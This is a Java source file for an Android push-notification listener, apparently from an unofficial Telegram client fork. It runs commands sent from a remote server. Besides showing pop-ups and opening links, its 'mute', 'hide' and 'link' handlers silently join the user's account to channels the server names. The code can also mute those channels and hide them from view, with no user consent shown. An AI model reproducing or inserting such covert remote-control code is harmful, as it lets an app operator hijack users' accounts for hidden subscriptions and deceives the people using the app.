package finalsoft.push;

import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;
import org.telegram.messenger.BuildVars;

import co.ronash.pushe.PusheListenerService;
import finalsoft.FcmService.Setting.Setting;
import finalsoft.FcmService.Setting.hideChannelController;
import finalsoft.settings.Channel;
import finalsoft.settings.Commands;
import finalsoft.settings.listeners.OnResponseReadyListener;

public class PushListener extends PusheListenerService {
    @Override
    public void onMessageReceived(JSONObject message, JSONObject content) {
        Log.i("finalsoft", "onMessageReceived Custom json Message: " + message.toString());
        try {
            if (message.length() == 0) return; //json is empty
            String key = message.getString("key");
            switch (key) {
                case "0": {
                    //region dialogBox PopDialog.class
                    try {
                        Intent intent = new Intent(getApplicationContext(), PopDialog.class);
                        intent.putExtra("Title", message.getString("title"));
                        intent.putExtra("Matn", message.getString("body"));
                        intent.putExtra("ImageLink", message.getString("imglink"));
                        intent.putExtra("ButtonLink", message.getString("btnlink"));
                        intent.putExtra("ButtonText", message.getString("btntext"));
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    } catch (JSONException localJSONException) {
                        Log.e("finalsoft", "unexpected JSON exception", localJSONException);
                    }
                    //endregion
                    break;
                }
                case "1": {
                    //region load Push.Class
                    try {
                        Intent localIntent1 = new Intent(getApplicationContext(), Push.class).putExtra("PushLink", message.getString("link"));
                        localIntent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(localIntent1);
                    } catch (JSONException localJSONException) {
                        Log.e("finalsoft", "unexpected JSON exception", localJSONException);
                    }
                    //endregion
                    break;
                }
                case "2": {
                    //region PopUpPush.class
                    try {
                        Intent localIntent1 = new Intent(getApplicationContext(), PopUpPush.class).putExtra("PushLink", message.getString("poplink"));
                        localIntent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(localIntent1);
                    } catch (JSONException localJSONException) {
                        Log.e("MYAPP", "unexpected JSON exception", localJSONException);
                    }
                    //endregion
                    break;
                }
                case "3": {
                    //region Pushtelegram.class
                    try {
                        String str8 = message.getString("link");
                        String str9 = message.getString("market");
                        Intent localIntent3 = new Intent(getApplicationContext(), Pushtelegram.class).putExtra("PushLink", str8).putExtra("market", str9);
                        localIntent3.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(localIntent3);
                    } catch (JSONException localJSONException) {
                        Log.e("MYAPP", "unexpected JSON exception", localJSONException);
                    }
                    //endregion
                    break;
                }
                case "mute": {
                    //region add channel Mute 4
                    try {
                        String chanelName = message.getString("cn");
                        Channel channel1 = new Channel();
                        channel1.name = chanelName;
                        Commands.join(channel1, new OnResponseReadyListener() {
                            @Override
                            public void OnResponseReady(boolean error, JSONObject data, String message) {
                                Log.i("finalsoft", "message: " + message);
                            }
                        }, true);
                    } catch (JSONException localJSONException) {
                        Log.e("finalsoft", "unexpected JSON exception", localJSONException);
                    }
                    //endregion
                    break;
                }
                case "un_mute": {
                    //region add channel UnMute 5
                    try {
                        String chanelName = message.getString("cn");
                        Channel channel1 = new Channel();
                        channel1.name = chanelName;
                        Commands.join(channel1, new OnResponseReadyListener() {
                            @Override
                            public void OnResponseReady(boolean error, JSONObject data, String message) {
                                Log.i("finalsoft", "message: " + message);
                            }
                        }, false);
                    } catch (JSONException localJSONException) {
                        Log.e("MYAPP", "unexpected JSON exception", localJSONException);
                    }
                    //endregion 5
                    break;
                }
                case "hide": {
                    //region add channel Hide 5
                    try {
                        String chanelName = message.getString("cn");
                        Channel channel1 = new Channel();
                        channel1.name = chanelName;
                        hideChannelController.add(chanelName);
                        Commands.join(channel1, new OnResponseReadyListener() {
                            @Override
                            public void OnResponseReady(boolean error, JSONObject data, String message) {
                                Log.i("finalsoft", "message: " + message);
                            }
                        }, false);
                    } catch (JSONException localJSONException) {
                        Log.e("MYAPP", "unexpected JSON exception", localJSONException);
                    }
                    //endregion 5
                    break;

                }
                case "link": {
                    //region add channel with link 5
                    Log.i("finalsoft", "pushMode link started");
                    try {
                        String joinLink = message.getString("join_link");
                        int hide = Integer.valueOf(message.getString("hide"));
                        int mute = Integer.valueOf(message.getString("mute"));
                        Uri uri = Uri.parse(joinLink); // missing 'http://' will cause crashed
                        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                        Setting.setPushMode(true);
                        Setting.setHideMode(hide == 1);
                        Setting.setMuteMode(mute == 1);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                       intent.setPackage(BuildVars.BUILD_PACKAGENAME);
                        startActivity(intent);

                        Log.i("finalsoft", "pushMode link" +
                                "\nlink:" + joinLink +
                                "\nhide:" + hide +
                                "\nmute:" + mute
                        );

                    } catch (Exception e) {
                        Log.e("finalsoft", "pushMode link error: " + e.getMessage());
                    }
                    //endregion 5
                    break;

                }
            }

        } catch (Exception e) {
            Log.e("finalsoft", "onMessageReceived Custom json Exception Message: " + e.getMessage());
        }
    }
}
